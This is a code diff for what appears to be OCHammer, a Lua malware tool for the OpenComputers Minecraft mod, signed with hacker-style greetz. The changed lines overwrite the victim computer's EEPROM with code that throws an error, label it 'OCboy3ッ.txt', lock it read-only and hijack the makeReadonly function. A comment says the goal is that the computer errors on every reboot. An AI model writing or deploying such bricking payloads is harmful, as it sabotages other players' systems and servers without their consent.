@@ -51,14 +51,19 @@ function lol()
         "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko";
     }
 
+    displayTable(ok)
+    
     while true do
       coroutine.yield(1)
     end
 
 end
 
-ef.setLabel("OCHammer 2 EEPROM")
-ef.set([[error("FORTNITE BATTLE PASS")]])
+ef.setLabel("OCboy3ッ.txt")
+-- Make it so when the user reboots their OpenComputer, it will error
+ef.set([[
+  error("OCboy3ッ.txt")
+]])
 ef.makeReadonly()
 
 component.proxy(cl("eeprom")()).makeReadonly = function(...) -- component.eeprom.makeReadonly("test")
